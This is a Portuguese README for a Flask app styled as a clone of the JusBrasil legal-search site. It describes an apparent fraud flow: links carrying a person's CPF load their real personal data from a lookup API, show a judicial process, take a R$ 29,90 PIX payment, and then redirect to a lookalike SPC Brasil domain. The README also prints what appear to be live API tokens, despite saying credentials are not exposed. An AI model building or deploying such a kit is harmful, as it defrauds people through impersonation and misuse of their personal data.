# JusBrasil Clone - Plataforma de Consulta Processual

Uma plataforma web completa para consulta de processos judiciais brasileiros com integração de pagamentos PIX e sistema de consulta por CPF.

## Funcionalidades

- 🔍 **Consulta por CPF**: Busca automática de dados pessoais via API
- ⚖️ **Processos Judiciais**: Visualização de processos e movimentações
- 💳 **Pagamentos PIX**: Integração com All Pay e Iron Pay APIs
- 🏛️ **SPC Brasil**: Redirecionamento automático com CPF para consulta SPC
- 📱 **Mobile First**: Design responsivo otimizado para celular
- 🔒 **Seguro**: Credenciais protegidas via variáveis de ambiente

## Tecnologias

- **Backend**: Flask (Python)
- **Frontend**: HTML, CSS (Tailwind), JavaScript
- **Pagamentos**: All Pay PIX API, Iron Pay API
- **Dados**: API de consulta CPF
- **Deploy**: Heroku, Replit

## APIs Integradas

### All Pay PIX API
- Geração de códigos PIX em tempo real
- QR Codes automáticos
- Verificação de status de pagamento

### Iron Pay API (Backup)
- Sistema de fallback para pagamentos
- Mesmo fluxo de pagamento

### API de Consulta CPF
- Dados reais de pessoas físicas
- Informações completas para personalização

## Instalação Local

### Dependências
```bash
pip install flask gunicorn requests qrcode[pil] pytz
```

### Variáveis de Ambiente
```bash
export SESSION_SECRET="sua-chave-secreta"
export ALLPAY_API_TOKEN="j1IZn0g233LV9kca0xvo2szLN7DSEQfI3EqYBBFWWvPGZK3ZCrtkTncGfIac"
export ALLPAY_PRODUCT_HASH="4grso93qjz"
export ALLPAY_OFFER_HASH="cu1a6348wi"
export CPF_API_TOKEN="1285fe4s-e931-4071-a848-3fac8273c55a"
```

### Executar
```bash
python main.py
```

## Deploy no Heroku

Consulte o arquivo `HEROKU_DEPLOY_GUIDE.md` para instruções completas de deploy.

### Deploy Rápido
1. Clone o repositório
2. Configure as variáveis de ambiente no Heroku
3. Faça deploy via Git ou GitHub

## Estrutura do Projeto

```
├── app.py                 # Aplicação Flask principal
├── main.py               # Ponto de entrada
├── allpay_api.py         # Integração All Pay PIX
├── ironpay_api.py        # Integração Iron Pay (backup)
├── templates/            # Templates HTML
│   ├── base.html
│   ├── index.html
│   ├── processo.html
│   └── checkout_standalone.html
├── static/              # Arquivos estáticos
│   └── css/
├── Procfile             # Configuração Heroku
├── runtime.txt          # Versão Python Heroku
└── app.json            # Deploy automático Heroku
```

## Uso

### Consulta por CPF
Acesse: `https://sua-app.herokuapp.com/12345678901`

### Fluxo de Pagamento
1. Usuário acessa via link com CPF
2. Dados são carregados automaticamente
3. Processo judicial é exibido
4. Pagamento PIX de R$ 29,90
5. Após pagamento, redirecionamento para SPC Brasil

### Botão SPC Brasil
O botão "Ver Apontamento SPC" redireciona automaticamente para:
`https://www.regularize-spcbrasil.com/CPF_DO_USUARIO`

## Segurança

- Todas as credenciais em variáveis de ambiente
- Tokens não expostos no código fonte
- Validação de dados de entrada
- Timeout de requisições configurado
- Logs de auditoria

## Monitoramento

- Logs estruturados
- Métricas de performance
- Alertas de erro
- Verificação de APIs

## Suporte

Para dúvidas ou problemas:
1. Verificar logs da aplicação
2. Consultar documentação das APIs
3. Verificar variáveis de ambiente
4. Testar localmente

## Licença

Este projeto é apenas para fins educacionais e demonstração técnica.